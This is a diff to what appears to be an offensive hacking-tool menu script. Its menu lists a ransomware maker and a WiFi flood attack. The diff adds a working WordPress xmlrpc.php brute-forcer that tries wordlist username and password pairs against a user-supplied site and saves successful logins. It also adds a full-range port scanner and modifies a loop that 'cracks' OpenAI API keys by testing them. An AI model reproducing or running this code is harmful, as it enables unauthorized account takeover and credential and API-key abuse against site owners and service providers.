@@ -1087,8 +1087,8 @@ def m2():
     {yellow}│{blue} [04] {green}Ransom Maker V1                                                                            {yellow}│{blue}
     {yellow}│{blue} [05] {gold}SQLite V1{blue}                                                                                  {yellow}│{blue}
     {yellow}│{blue} [06] NetBlitz {red}[Cool]{blue}                                                                            {yellow}│{blue}
-    {yellow}│{blue}                                                                                                 {yellow}│{blue}
-    {yellow}│{blue}                                                                                                 {yellow}│{blue}
+    {yellow}│{blue} [07] WP-Bypass {red}[Working!]{blue}                                                                       {yellow}│{blue}
+    {yellow}│{blue} [08] Port Sniffer {red}[Aight..]{blue}                                                                     {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
     {yellow}└─────────────────────────────────────────────────────────────────────────────────────────────────┘{blue}
@@ -5002,7 +5002,6 @@ elif answer == ("20"):
                 print(logo)
                 user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
                 # Set your OpenAI GPT API key
-                global count
                 count = int(0)
                 def chat_with_gpt(prompt):
                     ang = ['1','2','3','4','5','6','7','8','9','0']
@@ -5046,6 +5045,9 @@ elif answer == ("20"):
                             pass
                             chat_with_gpt(user_input)
                             if 'Incorrect API key provided' in r.text:
+                                print('\n\n')
+                                print(f'Not Valid Api Key, Cracking.. ©MrSanZz Times : {count} Api Key : {api_key} Output : {r.text}')
+                            elif 'quota' in r.text:
                                 print('\n\n')
                                 print(f'Not Valid Api Key, Cracking.. ©MrSanZz Times : {count} Api Key : {api_key} Output : {r.text}')
                             else:
@@ -5517,6 +5519,104 @@ elif answer == ("20"):
                     time.sleep(0.1)
             # Start the WiFi flood attack
             wifi_flood()
+        elif answer == '7':
+            def password_username():
+                with open(wordlist, 'r') as file:
+                    uparsed = file.readlines()
+                return uparsed
+            def parse(url):
+                if '/wp-login.php' in url:
+                    url = url.replace('wp-login.php', '/xmlrpc.php')
+                elif '/xmlrpc.php' in url:
+                    url = url
+                    pass
+                elif '/xmlrpc.php' in url is None:
+                    url = url + '/xmlrpc.php'
+                headers = {"User-Agent": random.choice(user_agents)}
+                response = requests.get(url, headers=headers, timeout=7)
+                if response.status_code == 200 or response.status_code == 405:
+                    if 'XML-RPC' in response.text:
+                        print("[+] Valid xmlrpc.php\n")
+                    else:
+                        print("[+] xmlrpc.php not detected in {}".format(url))
+                        url = url + '/xmlrpc.php'
+                        print("[+] Adding xmlrpc.php path to url {}\n".format(url))
+                else:
+                    print("[+] Url is not valid! {}\n".format(response.status_code))
+                return url
+            class bypass:
+                def __init__(self, url, **kwargs):
+                    self.url = url
+                    self.wordlist = kwargs.get('wordlist', {})
+                def __enter__(self):
+                    print("\n[+] Checking url..")
+                    url = parse(self.url)
+                    u = password_username()
+                    a = password_username()
+                    for username in u:
+                        for password in a:
+                            xml_payload = """
+                            <methodCall>
+                                <methodName>wp.getUsersBlogs</methodName>
+                                <params>
+                                    <param><value>{}</value></param>
+                                    <param><value>{}</value></param>
+                                </params>
+                            </methodCall>
+                            """.format(username, password)
+                            try:
+                                headers = {"User-Agent": random.choice(user_agents), "Contect-Type": "application/json"}
+                                response = requests.post(url, headers=headers, data=xml_payload, timeout=7)
+                                if 'blogName' in response.text:
+                                    print(Fore.GREEN + '[ Success ] : {}#{}@{}'.format(url, username, password))
+                                    with open("result.txt", "a") as result_file:
+                                        result_file.write(f"{url}/wp-login.php#{username}@{password}\n")
+                                    return True
+                                else:
+                                    print(Fore.RED + '[ Failed ] : {}#{}@{}'.format(url, username, password))
+                            except TimeoutError:
+                                print("[!] Site is down [Connection Timed Out!]")
+                                break
+                            except:
+                                print("[!] An error occured")
+                                break
+                def start(self):
+                    return self.__enter__()
+            if __name__ == '__main__':
+                site = input("\033[0m[+] Insert Site Target : ")
+                try:
+                    wordlist = input("[+] Wordlist Path : ")
+                except FileNotFoundError:
+                    print("[!] File not found!")
+                bypass(site, wordlist=wordlist).start()
+        elif answer == '8':
+            def port_scanner(target):
+                try:
+                    # Convert the target into an IP address
+                    target_ip = socket.gethostbyname(target)
+                except socket.gaierror:
+                    print("[-] Invalid hostname. Please try again.")
+                    return
+                print(f"[+] Scanning Target: {target_ip}")
+                # Define the range of ports to scan
+                start_port = 1
+                end_port = 65535
+                # Iterate through the range of ports
+                for port in range(start_port, end_port + 1):
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    socket.setdefaulttimeout(1)
+                    # Attempt to connect to the port
+                    result = sock.connect_ex((target_ip, port))
+                    if result == 0:
+                        print(f"[+] Port {port} is open")
+                    sock.close()
+            if __name__ == "__main__":
+                target = input("[+] Insert Target: ")
+                if 'https://' in target:
+                    target = target.replace('https://', '')
+                elif 'http://' in target:
+                    target = target.replace('http://', '')
+                port_scanner(target)
         else:
             print(green + f"Exit..")
             exit()
